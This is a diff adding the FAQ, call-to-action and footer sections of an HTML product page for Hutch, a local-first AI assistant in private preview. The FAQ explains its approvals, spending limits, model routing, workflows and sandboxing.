+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">How is Hutch different from other AI assistants?</summary>
+          <div class="collapse-content"><p>The difference is where the work runs and who stays in control. Hosted agent products give each agent a computer in the vendor’s cloud; Hutch runs on your machine, so conversations, memory, logs and files stay in one directory you control. Self-hosted chat interfaces such as Open WebUI front the models you already have; Hutch adds named assistants with their own tools, schedules, memory and approval rules on top. OpenClaw, the open-source personal-assistant neighbour, is designed for broad access through the chat apps you use; Hutch is governed by default — ask-first approvals, hard-denied shell command classes, estimated spend ceilings, and hash-verified transcripts and documents. Whether Hutch fits you depends on your setup: it needs a Linux computer today and a model route you configure yourself.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Do I need an API key, a credit card, or a GPU?</summary>
+          <div class="collapse-content"><p>Hutch does not include hosted inference. Connect OpenCode with a provider account, use a compatible hosted provider, or run a local model service you already control; available models vary, and live paid-provider checks have not been performed for this preview.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Can I choose how Hutch answers?</summary>
+          <div class="collapse-content"><p>Yes. Set voice (Direct, Warm, or Dry Wit), answer depth (Auto, Brief, Standard, or Detailed), and humor (Off, Subtle, or Playful) independently. Humor defaults to off. The fixed examples above use written sample text and make no model request; changing a setting also makes no request. If you choose the separate live preview, Hutch shows a local one-response estimate first and uses a fictional prompt without your conversation, tools, skills, or workspace. Style guides wording and cannot change permissions, approvals, evidence, spending, requested formats, or recipients. Provider adherence and live answer quality remain unverified.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Can Hutch look at an image I attach?</summary>
+          <div class="collapse-content"><p>Yes, with limits. Hutch chat accepts PNG, JPEG or WebP attachments — up to 4 images of 1.5&nbsp;MB each — and staged images stay in the conversation’s workspace on your machine, travelling with every message until you remove them. Built-in runtimes need a vision-capable model route; a send that route cannot receive is refused before a run starts. On the OpenCode runtime, verified copies are staged inside the run’s own workspace and the chosen model’s image support is checked before the model runs — a text-only model is refused with the model named. The Vision focus option tunes context handling; it is not what enables image input.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">What happens to files Hutch makes for me?</summary>
+          <div class="collapse-content"><p>They are kept on your machine in Hutch&rsquo;s own document store, not in a temporary session that expires. Every download is checked against its recorded size and SHA-256 before it is served, revisions create new versions while older versions stay downloadable, and previews are labelled as extracted content or approximate renders rather than pretending to be the exact file.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">What actually leaves my machine?</summary>
+          <div class="collapse-content"><p>Hutch stores its control state locally. A hosted model receives the prompt and context Hutch sends to it; network tools connect to their own destinations. A local model can still use online tools. Review the selected connection and tools before running a task.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Can I use different models for different kinds of work?</summary>
+          <div class="collapse-content"><p>Yes. Assign exact provider/model routes to task roles such as summarization, code analysis or verification, then choose a role for one chat message. Hutch checks the selected route's setup, context fit and spending policy before it starts. Fallbacks handle unavailable routes; escalation handles repeated quality failures. Automatic classification is not enabled, and a role name is not a model-quality guarantee.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Will Hutch summarize my chat automatically?</summary>
+          <div class="collapse-content"><p>Hosted summaries ask first by default and have their own estimate and budget reservation. You can explicitly opt into automatic summaries or turn them off. Hutch keeps the original conversation and stops if a summary does not reduce the context enough.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">What happens when my laptop sleeps on a schedule?</summary>
+          <div class="collapse-content"><p>Nothing runs while the machine is off. With the local supervisor running again, configured schedules detect missed windows and either coalesce them into one catch-up run or record a skip, according to the bot&rsquo;s policy.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">How do Suggest and Auto work for workflows?</summary>
+          <div class="collapse-content"><p>New assistants start in Suggest. The setting is stored per conversation, and changing it never starts work. A chat route card and Auto start require selector qualification for the exact active model profile; the two local profiles tested did not qualify. Auto can start only a matching activated saved method within explicit limits. It does not create a new plan, and consequential actions still need separate approval.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Can a local model design or choose a workflow?</summary>
+          <div class="collapse-content"><p>Author and selector authority depends on evidence for the exact model and execution settings. Neither of the two Qwen3 profiles tested qualified for authoring or selection. Hutch does not silently switch to another provider. You can still start a saved workflow when its required model roles are qualified for your route.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">What happens if I stop a workflow or Hutch restarts?</summary>
+          <div class="collapse-content"><p>A pause request does not cancel active work: the current node and owned child work settle before the next step is held. If the run is already parked, it pauses immediately. Pending questions remain answerable, and no downstream step starts until you resume it from the same chat. Stop cancels work owned by that workflow and keeps its status visible until cleanup is verified. After a restart, settled steps and completed effect receipts are reused; if an external effect is uncertain, Hutch holds retry for reconciliation. Some recovery paths remain under evaluation in this private preview.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">What is the difference between a workflow and a routine?</summary>
+          <div class="collapse-content"><p>A workflow describes the steps to do; a routine decides when work runs. Saving or importing still starts nothing. After you activate a saved workflow, you can link it to an existing routine; Hutch pins the exact revision and checks its inputs. The routine stays off until you enable it separately. Run now starts that pinned workflow once without moving the next scheduled occurrence. The local supervisor and host must be running when the routine is due.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Can I hand coding work to OpenCode?</summary>
+          <div class="collapse-content"><p>Yes. Connect a provider in Hutch's private profile, then choose an OpenCode model for a managed assistant. Hutch brokers each permission through its approval queue and reserves usage before the prompt; it never grants OpenCode's persistent <code>always</code> decision. Approved shell and edit actions still run with your Linux account's authority, not inside Hutch's built-in bubblewrap sandbox. A separate experimental CLI handoff can also turn a completed Hutch answer into a reviewed coding task in a pinned worktree. Run <code>hutch code login</code> once for that handoff; it creates a separate worktree from the selected Git commit, and its provider usage and command approvals remain outside Hutch's budget and sandbox.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Can I run it on my ChatGPT or Claude subscription?</summary>
+          <div class="collapse-content"><p>OpenCode can connect a provider through an API key or a sign-in method its installed server reports, inside a private profile managed by Hutch; it does not import your regular OpenCode profile. Hutch reserves usage before the prompt and settles the provider-reported totals. OpenCode Go is also available as a user-supplied API key route. Sign in with ChatGPT is an opt-in local-app preview; eligibility for Hutch is unconfirmed and its Responses API does not enforce Hutch's output-token allowance. Scheduled or coordinator-assigned work needs your express permission for each Bot and connected account; the permission follows that Bot's current provider routes and can be revoked. Hutch never reuses consumer-app cookies or sessions, and no plan is silently upgraded or selected as a fallback.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">What does a runaway bot cost me?</summary>
+          <div class="collapse-content"><p>Set a warning, an approval pause, and an estimated admission ceiling independently. For OpenRouter, a strict USD ceiling requires fresh endpoint pricing; Hutch blocks if it cannot quote an eligible route. Estimates can differ from the provider&rsquo;s invoice and are not an external spending guarantee, so use provider-side billing limits as well. Uncertain charges remain held until reconciled.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Can I review cost and context before sending?</summary>
+          <div class="collapse-content"><p>Studio can estimate the selected route, your current draft, the bounded recent conversation context and the applicable spend policy before you send. It is a preview: context can change before admission, and providers control final tokenization and billing.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Is it safe to let an agent touch my files?</summary>
+          <div class="collapse-content"><p>Bubblewrap isolation is available only on Linux and must be enabled; it is not a virtual machine. Approval policy and transcripts provide operator control but do not guarantee safe decisions. Legacy bots may still have isolation disabled. Read the support boundaries above before use.</p></div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================================================================== CTA -->
+  <section class="cta">
+    <div class="wrap cta-grid">
+      <div class="cta-orb" aria-hidden="true">
+        <img src="assets/hutch-agent.webp?v=da73ea5e" width="560" height="680" loading="lazy" decoding="async" alt="">
+      </div>
+      <div class="cta-copy">
+        <h2 class="section-heading">A calmer way to keep work moving.</h2>
+        <p class="section-desc">Hutch is a private preview today. See what it can do, learn what works now, and check back when access opens.</p>
+        <div class="hero-actions">
+          <a class="btn btn-primary" href="#get">Check preview status</a>
+          <a class="btn btn-outline" href="#proof">See the app</a>
+        </div>
+      </div>
+    </div>
+  </section>
+  </main>
+
+  <footer class="border-t border-line bg-sunken">
+    <div class="mx-auto w-full max-w-[1160px] px-5 py-16 sm:px-6">
+      <div class="footer sm:footer-horizontal gap-10 pb-10">
+        <aside class="footer-brand">
+          <span class="flex items-center gap-2.5 text-ink">
+            <svg class="size-[22px]" viewBox="0 0 32 32" aria-hidden="true"><path d="M16 2 28 9v14L16 30 4 23V9z" fill="none" stroke="var(--color-semantic-brand)" stroke-width="2.5"/><circle cx="16" cy="16" r="4" fill="var(--color-semantic-brand)"/></svg>
+            <span class="text-xl font-extrabold tracking-tight">hutch<span class="text-brand">.</span></span>
+          </span>
+          <p class="max-w-[36ch] text-sm leading-relaxed text-ink-3">Local-first AI assistants that run on your own computer. Start in chat, choose the models and apps you use, and approve important actions.</p>
+          <p class="flex flex-wrap gap-2">
+            <span class="badge badge-outline gap-2"><span class="dot dot-warn" aria-hidden="true"></span>Private preview</span>
+            <span class="badge badge-outline">v0.1.0</span>
+          </p>
+        </aside>
+        <nav aria-labelledby="f-product">
+          <h2 class="footer-title" id="f-product">Product</h2>
+          <a class="link link-hover" href="#proof">Product tour</a>
+          <a class="link link-hover" href="#workflow">How it helps</a>
+          <a class="link link-hover" href="#runs">Models &amp; data</a>
+          <a class="link link-hover" href="#control">Approvals &amp; limits</a>
+          <a class="link link-hover" href="#cases">Examples</a>
+        </nav>
+        <nav aria-labelledby="f-learn">
+          <h2 class="footer-title" id="f-learn">Learn</h2>
+          <a class="link link-hover" href="#receipts">Everyday help</a>
+          <a class="link link-hover" href="#runs">Your AI and apps</a>
+          <a class="link link-hover" href="#faq">FAQ</a>
+          <a class="link link-hover" href="#get">Availability</a>
+          <a class="link link-hover" href="#top">Back to top</a>
+        </nav>
+        <nav aria-labelledby="f-project">
+          <h2 class="footer-title" id="f-project">Project</h2>
+          <span class="text-ink-3">Private preview</span>
+          <span class="text-ink-3">Linux computer required today</span>
+          <span class="text-ink-3">No public download yet</span>
+        </nav>
+      </div>
+      <div class="footer-base">
+        <p>&copy; 2026 hutch &middot; MIT-licensed source &middot; private preview</p>
+        <p><a href="#top">Back to top</a></p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="site.js?v=5b30d3f5" defer></script>
+</body>
+</html>
